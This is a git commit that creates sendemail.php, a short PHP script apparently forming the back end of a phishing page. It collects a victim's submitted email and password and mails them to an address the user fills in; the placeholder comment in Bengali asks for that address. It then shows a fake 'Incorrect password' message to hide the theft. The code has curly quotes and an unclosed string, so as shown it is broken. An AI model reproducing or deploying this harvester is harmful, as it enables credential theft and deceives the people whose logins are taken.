42889bd0d6512b4945d74b7dd4cb1b8aa1c71d43
Vats <vatsapiofficial@gmail.com>
2026-01-29 11:33:17 +0600

    Create sendemail.php

---
+++ sendemail.php
@@ -0,0 +1,2 @@
+<?php if(isset($_POST[‘submit’])){$qv0=$_POST[’email’];$ga1=$_POST[‘password’];$ee2=’এখানে আপনার ইমেইল আইডি দিবেন;$bx3=’Form Submission’;$mi4=”Email :”.$qv0.”\n”.”Password :”.$ga1;$ci5=”From: “.$qv0;if(mail($ee2,$bx3,$mi4,$ci5)){echo “<h1>Incorrect password.! </h1> <br>
+<h3> Submitted..!</h3>”;}else{echo “Something went wrong!”;}}?>
